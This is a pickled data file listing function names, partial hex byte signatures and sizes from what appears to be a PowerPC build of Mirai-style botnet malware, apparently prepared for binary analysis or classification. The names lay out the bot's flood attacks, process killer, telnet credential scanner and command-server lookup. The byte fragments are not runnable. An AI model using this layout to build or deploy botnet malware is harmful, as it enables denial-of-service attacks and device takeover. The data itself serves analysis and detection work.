(lp0
(S'_init'
p1
S'9421e008a690012400c94801fd80242120a64e80'
p2
L36L
tp3
a(S'__do_global_dtors_aux'
p4
S'9421'
p5
L148L
tp6
a(S'call___do_global_dtors_aux'
p7
S'7c0290011401142110a64e80'
p8
L28L
tp9
a(S'frame_dummy'
p10
S'3d08a639009421'
p11
L108L
tp12
a(S'call_frame_dummy'
p13
S'7c0290011401142110a64e80'
p14
L28L
tp15
a(S'_start'
p16
S'7c0b213dadb738009421'
p17
L72L
tp18
a(S'attack_app_http'
p19
S'9421a6938190017c1b8190c121980138009001b000000154007c038138004800059001a80154007c03813dc92a00dd7801a48851'
p20
L12628L
tp21
a(S'attack_init'
p22
S'9421e008a690012460003d8900bd3d894800ad38028948009d3809898d60003d8948007d60008948006d3805380860003d894d38073d8948003d3d8938087c03012408a638004e80'
p23
L196L
tp24
a(S'attack_kill_all'
p25
S'9421e008a6900124000000700108290c003a4a14090080419e008008290c003a4a14090078804800852002290c003a4a14000021080901010880409dff012408a638004e80'
p26
L164L
tp27
a(S'attack_parse'
p28
S'9421c093a100009081000000012c80409d0309007800097801180904012809fc90012c012c80419e0321280116810090012809ff012c80419e038100980115380090012809ff01152f80419e03212c01151c00419c0288007c0380480085780110000000c400187801100221280b1009040128001878011002212800980b1421280901212c09fb90012c011c0018780110020002011c001878011002011c0018780110020910211c09010115801c8900ff802c80419e01810098011421280901212c09ff0114002f80419e010114007c03804800497c1b010c0000002c012c80419e0100003878010c692800980b0421280901212c09ff012c80419e01212801080901212c09ff0108802c890000801c003878010ca900540938007c038048007d601b1d00003878010c29142900007d4b78817800087c03012814012809802c095090012c211c0901011409801c8900fe4800a938009009000116540a88008800007d5b7844537825007c03010c004d801080419e00610048000d2f80419e00880000807c03007c03380080'
p29
L1052L
tp30
a(S'attack_start'
p31
S'9421d0a690013461007c23a9007c3b0128211d48001590011000'
p32
L384L
tp33
a(S'attack_get_opt_str'
p34
S'9421d0788178c19921180000005c80083878011c2914090409880054007f48000001083878011c29142900002c210809010118800800419dff9001280378213000'
p35
L172L
tp36
a(S'attack_get_opt_int'
p37
S'9421d0a6900134691ca00021180118880054007d4b788178c04b'
p38
L148L
tp39
a(S'attack_get_opt_ip'
p40
S'9421d0a6900134691ca00021180118880054007d4b788178c04b'
p41
L144L
tp42
a(S'add_attack'
p43
S'9421e008a6900124601b8118600038d47c1b010801182108090069020054093a0904637c03001d3d098809847d5378003a7820022b1401080a013d098408a638004e80'
p44
L196L
tp45
a(S'free_opts'
p46
S'9421e008a6900124610090811880419e00009001080001083878011802090080419e000108387801180209007800598100900108211c809cff4800357c034e80'
p47
L160L
tp48
a(S'attack_gre_ip'
p49
S'94218093a1008178c19921589801608800007c0380480079601b01488800007c038102c04b'
p50
L2164L
tp51
a(S'attack_gre_eth'
p52
S'9421607c029001a47c1b8178c19921780180067c038048000590015c88007c038102c04bffa998015888007c038103c060'
p53
L2360L
tp54
a(S'attack_tcp_syn'
p55
S'94218093a1008178c19921589801608800007c03804800cd601b01408800007c038102c04b'
p56
L2404L
tp57
a(S'attack_tcp_ack'
p58
S'94218093a1008178c19921589801608800007c0380480078014c8800007c038102c04bff0d9801488800007c038103c060'
p59
L2248L
tp60
a(S'attack_tcp_stomp'
p61
S'9421507c029001b469'
p62
L2776L
tp63
a(S'attack_udp_generic'
p64
S'9421907c02900174694c7c2bc19921489801508800007c03804800900134015054007c038102c04bff6d7c1b0130007c038103c060'
p65
L1640L
tp66
a(S'attack_udp_vse'
p67
S'9421907c02900174694c7c2bc19921489801508800007c03804800780130007c038102c04bff0598012c015054007c038103c060'
p68
L1512L
tp69
a(S'attack_udp_dns'
p70
S'94217008a693a1008178c19921688800007c038048007801588800007c038102c04bff1d9801548800007c038103c060'
p71
L2004L
tp72
a(S'attack_udp_plain'
p73
S'9421907c0293a1001b8178c19921489801508800007c03804800780124014854007c03804800780120007c038107380060'
p74
L1072L
tp75
a(S'get_dns_resolver'
p76
S'9421a09001381e4800381e38697c03804c'
p77
L696L
tp78
a(S'checksum_generic'
p79
S'9421e061009081000034210800810221100902210c09'
p80
L196L
tp81
a(S'checksum_tcpudp'
p82
S'9421c0900144906100908178c1b000802c0118090c01142128011000000134010800810054007c03010c0090010c21180902213409'
p83
L416L
tp84
a(S'killer_init'
p85
S'942120a693a11038013800797c1b012c0000007c1b2002200280419d050200'
p86
L1484L
tp87
a(S'killer_kill'
p88
S'9421'
p89
L48L
tp90
a(S'killer_kill_by_port'
p91
S'94218093a122016839107c03807d4b78003810200078807d4b78003820200178807d4b7800380090012c000000000000000000000140900124000001687c03007c1b21517c03807d4b780038220378007c1b80409e000151540098015388220098015438009801553800980151380098015238064800600048006000480020016900'
p92
L2148L
tp93
a(S'has_exe_access'
p94
S'9421d0a6900134011401106000480038074800380638559d7c1b61007c03007c1b09780110140110687821140378807d4b78007c1b61007c03007c1b09780110140110600038552d807c03007c1b0978011014011001140378804c'
p95
L412L
tp96
a(S'memory_scan_match'
p97
S'9421b008a690015490611000006110804c'
p98
L576L
tp99
a(S'mem_exists'
p100
S'9421d0812000002124011c890000900128008800540b80087801200209007f007c005400'
p101
L228L
tp102
a(S'main'
p103
S'942120a693a106e46106b8380090012809007800380003003800038048003800007c03a005003871380538713d6902'
p104
L2952L
tp105
a(S'anti_gdb_entry'
p106
S'9421'
p107
L32L
tp108
a(S'resolve_cnc_addr'
p109
S'9421d0a693a1006000480060003845417c1b037800e990010860004800010880419e0083e56b810054007c030b7c49d67c585054003a020900297c0904610048003804006000804800601b097809003d297c0902600000013408a6833000'
p110
L228L
tp111
a(S'establish_connection'
p112
S'9421e008a693a100600038004800601b2002200200'
p113
L224L
tp114
a(S'teardown_connection'
p115
S'9421'
p116
L84L
tp117
a(S'ensure_single_instance'
p118
S'9421c093a100009001186000380048007c1b2002200200'
p119
L532L
tp120
a(S'unlock_tbl_if_nodebug'
p121
S'9421907c029061002001293069080118410091012409100000000000af98010a090c2138600004785b780038009001140038093a01080229300978010c0090010c21140901011480409dff800c80409e00380090016c48009c380090011400f881007d4a1409104100810038007d4a14091038007d521469100901211001084a140108211009010114003c01142114090e900114011400700094900114211409f99001146100007c1b61007c4bd67c49d67c58507c030168880054007c077400f87c07740988007c02010a0903011480409dff010a3c3860001654007e00095098010a0054093a010802293009a64e80012a0478007c1b0109011878804800012a78804800010990016c806c7c03017408a6380080'
p122
L652L
tp123
a(S'rand_init'
p124
S'9421e008a693a10060004800601b2002007c1b007c1ba01090093057917c1b20022002200260022002012408a6832000'
p125
L128L
tp126
a(S'rand_next'
p127
S'9421e0200201080980087801080980087801080930092c200220022002200220020b2002600220022002010802200220020378212000'
p128
L180L
tp129
a(S'rand_str'
p130
S'9421e008a693a10061009081a4800c80409d008321781d003800010809fc90010c006c800c80409d00a1'
p131
L220L
tp132
a(S'rand_alphastr'
p133
S'9421b008a69001549061009081010944390060007d4b7804785b78004800f4803c80409d00601b010c00000060800c01080090010c01085400'
p134
L324L
tp135
a(S'resolv_domain_to_hostname'
p136
S'9421e008a6900124610090811c007809010118211809010000008c0900211c090101082f80419e0001082f80409e00810098090001100901000000280901210c0108210c0901011409700114005400'
p137
L280L
tp138
a(S'resolv_skip_name'
p139
S'9421d081200000212000010090810054002b00211800540b8100880054007d0209900108011c291409ff000121180901010c80409e00810038008100810054002f80409eff0080409e0081003800810038004e80'
p140
L240L
tp141
a(S'resolv_lookup'
p142
S'9421e008a693a11161103801804800601b014c38000148810001448080b561003b601b097801447d020901000000000000000061003b7c030911000000ff0000'
p143
L1764L
tp144
a(S'resolv_entries_free'
p145
S'9421'
p146
L84L
tp147
a(S'recv_strip_null'
p148
S'9421d0a6900134610090812001208178c148007c1b010c010c80409d00009001080000004081007d0209002f80409e0081007d02004198090009010108809c'
p149
L192L
tp150
a(S'scanner_init'
p151
S'942130a693a107d4007c1b2002200280419d19200200'
p152
L6544L
tp153
a(S'scanner_kill'
p154
S'9421'
p155
L48L
tp156
a(S'setup_connection'
p157
S'9421d0a693a10061003800900108000000000000211800'
p158
L344L
tp159
a(S'get_random_ip'
p160
S'9421e008a69001240004'
p161
L704L
tp162
a(S'consume_iacs'
p163
S'9421d0a690013461003800900110091c010c0044810054002f80409e020009002f80409e02610080010e1d2f80419e02210c2901002f80409e00810090010c2110090200cc8100880054002f80409e003d2900011421163d29002908610099211f8080020d7880419e01002902002f80409e00210c0903211009032128211403782478a0400031212821177c032478a04000318080020c7c1b80419e003800900108000978010c291409002f80409e00800878010c291400fc98090000010878010c291409002f80409e00010878010c291400fd9809000901010880409d'
p164
L660L
tp165
a(S'consume_any_prompt'
p166
S'9421e0610038'
p167
L268L
tp168
a(S'consume_user_prompt'
p169
S'9421e008a6900124610038'
p170
L448L
tp171
a(S'consume_pass_prompt'
p172
S'9421e008a6900124610038'
p173
L344L
tp174
a(S'consume_resp_prompt'
p175
S'9421e008a69001246100381a0c3800381a78007c1b010c2118091c2118211029'
p176
L288L
tp177
a(S'add_auth_entry'
p178
S'9421c093a10000908178012069020938007d5b780478003d3d09a0809c54007c032002ab02610038007c0300901d10809c54007c0320022b14010898090c2002007c032002ab026100010878007c1b1d10809c54007c0320022b14010898090d809c54007c0320026b3d09a45400b0003d49379c7d5378007c0320026b3d09a45409a0091400b00038003d099c3d09a45409a00914003d09a480447c03380080'
p179
L432L
tp180
a(S'random_auth_entry'
p181
S'9421e008a6900124ffc13d09a454007c030b7c49d67c5850b000380090010c0090800c007c0320022b140908a0007f4840419c0000007c0320022b14090aa0007f4840409c00010c007c0320026b91610048002c210c09012002010c809cff009001180378012408a638004e80'
p182
L256L
tp183
a(S'report_working'
p184
S'9421b008a693a100007c23a100001d9001100000011080419d02011020'
p185
L620L
tp186
a(S'deobf'
p187
S'9421e008a69001246100908118087c1b211c0900290009017800617c1b0108290009018178002d90010c00800c0978010802010c097801080209006c00ff'
p188
L388L
tp189
a(S'can_consume'
p190
S'9421d08120091c0b7821180b1401080978011c2914010800005400'
p191
L88L
tp192
a(S'table_init'
p193
S'9421'
p194
L1028L
tp195
a(S'table_unlock_val'
p196
S'9421e008a6900124601b01180054003878200209'
p197
L84L
tp198
a(S'table_lock_val'
p199
S'9421e008a6900124601b01180054003878200209'
p200
L84L
tp201
a(S'table_retrieve_val'
p202
S'9421e061009081183878200209'
p203
L92L
tp204
a(S'add_entry'
p205
S'9421d0a6900134601b812001207800917c1b0108812004880054003d298c384a140108011880203d298c187d4a144900013408a638004e80'
p206
L148L
tp207
a(S'toggle_obf'
p208
S'9421e0601b01180054003878200209'
p209
L388L
tp210
a(S'util_strlen'
p211
S'9421e06100380090010800810090010809007c005400'
p212
L92L
tp213
a(S'util_strncmp'
p214
S'9421d0a69001346100908120'
p215
L248L
tp216
a(S'util_strcmp'
p217
S'9421d0a69001346100908118'
p218
L228L
tp219
a(S'util_strcpy'
p220
S'9421e008a6900124610090811c'
p221
L84L
tp222
a(S'util_memcpy'
p223
S'9421d08120010c011c010800810054008100810090010c21080901212009ff212000'
p224
L116L
tp225
a(S'util_zero'
p226
S'9421e06100908118001c2108000021080901211c09ff211c00'
p227
L84L
tp228
a(S'util_atoi'
p229
S'9421c09001449061009081000000212800900118090101187c0300152f80409eff801880409e0000012128009001180901002c011880409e00810054009001180901011080419e003c800138003d213800ff2138212c61000b7c49d67c58509001080114009001140000000001187c0300a12f80419e00211809d0006080187c0300957c1b80419e0080187c0300297880419e003800900134000c205791213401180950900118212c809c0080419c00011c2114809d00011c2114809e008018809d0038'
p230
L704L
tp231
a(S'util_itoa'
p232
S'9421a09001906100815080502f80409e00380090015448005880482f80419e0138009001100000014c2f80409e0080482f80409c00000101487c00900108000114014890010800214c81967c49d67c585090010c010c80419d00210c09300010093790010c21100b38007d4a14694c80089690010809ff010880409eff80419e00211001084a14002d480010090101107801181461000478'
p233
L412L
tp234
a(S'util_memsearch'
p235
S'9421d0812000002124011c89000038'
p236
L228L
tp237
a(S'util_stristr'
p238
S'9421d0a69001346100908120011461004bff497c1b0110000000142114090021140901010c0978012002090001092b00880054002b008800600060540090012c00100090012c012c0109002b00880054002b00880060006054009001280088005400900128010809880054007f00409e00210c0901210c011000409e0081007d48509121240040380090010c011c0970011c005400'
p239
L408L
tp240
a(S'util_local_addr'
p241
S'9421d0a69001340010007c1b00006000380048000d90010800'
p242
L216L
tp243
a(S'util_fdgets'
p244
S'9421d0a690013461009081200000000001087801181461007c03a0067d601b010c010c80409e0021082901000c01080128010c80409e000108809c002108291429ff002f80409eff002f80419e008018000c000001240378013408a638004e80'
p245
L240L
tp246
a(S'util_isupper'
p247
S'9421'
p248
L80L
tp249
a(S'util_isalpha'
p250
S'9421'
p251
L112L
tp252
a(S'util_isspace'
p253
S'9421'
p254
L112L
tp255
a(S'util_isdigit'
p256
S'9421'
p257
L80L
tp258
a(S'ioctl'
p259
S'7c029421d0747f5000780134013801100003ab2b01089e005040419d0080800000203c80006c80409e0000287800cd000c8048005d7c1b004038ff38'
p260
L232L
tp261
a(S'fcntl'
p262
S'7c02390093e12c013404f42b00211000379121102003a100'
p263
L132L
tp264
a(S'fcntl64'
p265
S'7c0293e12c013401380110000300cc90a1007c0074107c1ba2078560'
p266
L100L
tp267
a(S'chdir'
p268
S'7c0293e10c0114000c000274107c1ba2073d38ffe10c2110a64e80'
p269
L72L
tp270
a(S'close'
p271
S'7c0293e10c0114000644000274107c1ba206f593e30060'
p272
L72L
tp273
a(S'fork'
p274
S'7c0293e10c011400020274107c1ba206ad93e30060'
p275
L72L
tp276
a(S'getpid'
p277
S'7c0293e10c01140014000274107c1ba20693e30060'
p278
L72L
tp279
a(S'getppid'
p280
S'7c0293e10c0114004044000274107c1ba2061d38ffe10c2110a64e80'
p281
L72L
tp282
a(S'kill'
p283
S'7c0293e10c011400257c0074107c1ba2050060'
p284
L72L
tp285
a(S'open'
p286
S'7c02390093e12c01348090a100390091210c21102003a94b78000274107c1ba2050060'
p287
L120L
tp288
a(S'creat'
p289
S'7c23804c'
p290
L16L
tp291
a(S'prctl'
p292
S'7c0293e10c011400ab44000274107c1ba2050060'
p293
L72L
tp294
a(S'read'
p295
S'7c0293e10c011400030274107c1ba20493e30060'
p296
L72L
tp297
a(S'readlink'
p298
S'7c0293e10c0114005544000274107c1ba20493e30060'
p299
L72L
tp300
a(S'select'
p301
S'7c0293e10c0114008e0274107c1ba20493e30060'
p302
L72L
tp303
a(S'setsid'
p304
S'7c0293e10c0114004244000274107c1ba20393e30060'
p305
L72L
tp306
a(S'sigprocmask'
p307
S'2c007c027c1bc02b0000ae93e10c'
p308
L120L
tp309
a(S'time'
p310
S'7c0293e10c0114000d7c0074107c1ba20338ffe10c2110a64e80'
p311
L72L
tp312
a(S'unlink'
p313
S'7c0293e10c0114000a0274107c1ba20293e30060'
p314
L72L
tp315
a(S'write'
p316
S'7c0293e10c01140004000274107c1ba20238ffe10c2110a64e80'
p317
L72L
tp318
a(S'closedir'
p319
S'7c023c10bf7f780134a3003800eb7f788040be0239'
p320
L164L
tp321
a(S'opendir'
p322
S'7c023800e000'
p323
L272L
tp324
a(S'readdir'
p325
S'9421d0a63c10bfa31b847861007feb900134007feb480080043f007f00bd00801400110041a10048003c00001f003f007f0ca9007c021f001d007c582f80419eff8048007febbb08a638004e80'
p326
L192L
tp327
a(S'__errno_location'
p328
S'3c1038d800'
p329
L12L
tp330
a(S'clock'
p331
S'9421e008a6380800807c02012463102120a654637e80'
p332
L56L
tp333
a(S'memcpy'
p334
S'54a9'
p335
L156L
tp336
a(S'memmove'
p337
S'7f18682bbcffe814432a'
p338
L164L
tp339
a(S'memset'
p340
S'54a92363fc514a44514a80'
p341
L144L
tp342
a(S'tcgetattr'
p343
S'9421c0bf9f2380a1749001444c'
p344
L156L
tp345
a(S'tcsetattr'
p346
S'2f8401a69421b041007c1b01547c2b9e002f8402002f8400c0419e00480010c0480020fd09803800900300003fc08000a0009f008118410089008034df38210c6100914100012bc14b'
p347
L356L
tp348
a(S'inet_addr'
p349
S'9421e008a6380000a52f8338ff008080242120a64e80'
p350
L52L
tp351
a(S'accept'
p352
S'9421e008a690610038053800a11380242120a64e80'
p353
L52L
tp354
a(S'bind'
p355
S'9421e008a690610038028124a11280242120a64e80'
p356
L52L
tp357
a(S'connect'
p358
S'9421e008a690610038038124a11280242120a64e80'
p359
L52L
tp360
a(S'getsockname'
p361
S'9421e008a69061003806908108a11238007c03'
p362
L52L
tp363
a(S'getsockopt'
p364
S'9421d0a6906100389000900134a100e1181201342130a64e80'
p365
L60L
tp366
a(S'listen'
p367
S'9421e008a69061003804810800292120a64e80'
p368
L48L
tp369
a(S'recv'
p370
S'9421e008a6906100380a8124a10000f180242120a64e80'
p371
L56L
tp372
a(S'recvfrom'
p373
S'9421d0a6906100380c8108a100e11800b101342130a64e80'
p374
L64L
tp375
a(S'send'
p376
S'9421e008a690610038098124a100007901242120a64e80'
p377
L56L
tp378
a(S'sendto'
p379
S'9421d0a6906100380b8134a100e11800392130a64e80'
p380
L64L
tp381
a(S'setsockopt'
p382
S'9421d0a6906100380e908108a100e1181080342130a64e80'
p383
L60L
tp384
a(S'socket'
p385
S'9421e008a690610038018124a11080242120a64e80'
p386
L52L
tp387
a(S'raise'
p388
S'7c02bf7d780124ff6d8024a4ebbb2120a64bff'
p389
L48L
tp390
a(S'sigaddset'
p391
S'7c02900114802f80408118f8c10039'
p392
L76L
tp393
a(S'sigemptyset'
p394
S'7c0238004b'
p395
L44L
tp396
a(S'signal'
p397
S'2f84'
p398
L224L
tp399
a(S'__sigismember'
p400
S'38fa5484'
p401
L40L
tp402
a(S'__sigaddset'
p403
S'3801fa5484'
p404
L40L
tp405
a(S'__sigdelset'
p406
S'38'
p407
L40L
tp408
a(S'malloc'
p409
S'2c007c02bf0134a20038'
p410
L344L
tp411
a(S'calloc'
p412
S'2f837c02bfe4d69001149e001f1b7f0041bef589000c0300007ffb78'
p413
L112L
tp414
a(S'free'
p415
S'2c007c02bf0124'
p416
L256L
tp417
a(S'realloc'
p418
S'2c007c02bf7c780124a2'
p419
L304L
tp420
a(S'__heap_alloc'
p421
S'8103002b00390c230000007f584041bc008a40409c00690000090809088800007d53780804001853780300000b90090048509100380c808100409eff80'
p422
L160L
tp423
a(S'__heap_alloc_at'
p424
S'817805007d58503900894041bd2040be007f289c0005009c008100419e000b084b008100419e002a0480912800007c18a3004e808100ff4e80'
p425
L156L
tp426
a(S'__heap_link_free_area'
p427
S'2f8500a400419e008504000886000090860800'
p428
L44L
tp429
a(S'__heap_link_free_area_after'
p430
S'2c0041'
p431
L28L
tp432
a(S'__heap_free'
p433
S'7c027c1b6000bf0124e30014001000eb78ff049f0038000040409e'
p434
L300L
tp435
a(S'atol'
p436
S'38004800'
p437
L12L
tp438
a(S'strtol'
p439
S'38004800'
p440
L8L
tp441
a(S'_stdlib_strto_l'
p442
S'7c023d211499230134be337f7849377c0008ff0169700040'
p443
L436L
tp444
a(S'exit'
p445
S'9421d0a63c10bfa03730c138787f78c378013400c5eb4800b5200280419e007ffb7809a64e80c378804800954800f53d29008900004b'
p446
L132L
tp447
a(S'sleep'
p448
S'7c1b08a6942140bf01c4013920a6380039000091490039ff107d3a00'
p449
L468L
tp450
a(S'__uClibc_fini'
p451
S'3d2002023900585093e10c7f700114001829007c032f9f003b'
p452
L148L
tp453
a(S'__pthread_return_0'
p454
S'380000'
p455
L8L
tp456
a(S'__check_one_fd'
p457
S'9421'
p458
L96L
tp459
a(S'__uClibc_init'
p460
S'7c023d200029000114090080409e00003d0bd400009a3d29008900008014e10c2110a64b'
p461
L128L
tp462
a(S'__uClibc_main'
p463
S'7c023d21947c2b01b4807c022bc000a010915d37c49a7c331e007c3b8a000090bd003800'
p464
L620L
tp465
a(S'__socketcall'
p466
S'7c0293e10c01140044000274107c1ba2e80060'
p467
L72L
tp468
a(S'_exit'
p469
S'7c02bf7e780114000178000274107c1b'
p470
L60L
tp471
a(S'fstat'
p472
S'9421907c023b0023006c7feb44000274103b1b'
p473
L116L
tp474
a(S'__getdents'
p475
S'7c02bf9f230124007d7e7981140044810cbf00901f007f00bf'
p476
L144L
tp477
a(S'__getdents64'
p478
S'7c0281000500be00d078216e7c23b77876780117541b38007fdb000274107c1b'
p479
L344L
tp480
a(S'getegid'
p481
S'7c0293e10c011400320274107c1ba2e593e30060'
p482
L72L
tp483
a(S'geteuid'
p484
S'7c0293e10c011400310274107c1ba2e593e30060'
p485
L72L
tp486
a(S'getgid'
p487
S'7c0293e10c0114002f44000274107c1ba2e493e30060'
p488
L72L
tp489
a(S'getuid'
p490
S'7c0293e10c011400180274107c1ba2e493e30060'
p491
L72L
tp492
a(S'lseek64'
p493
S'7c027c'
p494
L128L
tp495
a(S'nanosleep'
p496
S'7c0293e10c011400a27c0074107c1ba2e393e30060'
p497
L72L
tp498
a(S'sbrk'
p499
S'7c02bfe0027e78600080ec2f8040be0500009e0080ec7c036014be0500003b'
p500
L112L
tp501
a(S'times'
p502
S'7c0293e10c0114002b0274107c1ba2e293e30060'
p503
L72L
tp504
a(S'__xstat64_conv'
p505
S'9421e008a638007c237c78807feb900124ff395c003d003c083d001c101c141d00901d001d0081915d003c303d001c383c4081915d00001d001d001d008120a64e80'
p506
L204L
tp507
a(S'__xstat_conv'
p508
S'9421e008a638007c237c78807feb900124ff6d803900901d0080901d00901d001d00901d001d00913d001c1c1d00901d001d00901d00901d00901d008120a64e80'
p509
L176L
tp510
a(S'mempcpy'
p511
S'7c02bf7c780124bde180247c1481a638004e80'
p512
L52L
tp513
a(S'inet_aton'
p514
S'2c0041'
p515
L192L
tp516
a(S'sigaction'
p517
S'9421c03900bf9f23be1b0144380041'
p518
L196L
tp519
a(S'_dl_aux_init'
p520
S'801c2002200209e8'
p521
L28L
tp522
a(S'brk'
p523
S'9421'
p524
L52L
tp525
a(S'__syscall_rt_sigaction'
p526
S'7c0293e10c011400ad44000274107c1ba2dd93e30060'
p527
L72L
tp528
a(S'__syscall_error'
p529
S'7c02bf7d780124'
p530
L52L
tp531
a(S'__do_global_ctors_aux'
p532
S'7c023d2904e10c0114e9'
p533
L80L
tp534
a(S'call___do_global_ctors_aux'
p535
S'7c0290011401142110a64e80'
p536
L28L
tp537
a(S'_fini'
p538
S'9421e008a6900124'
p539
L32L
tp540
a.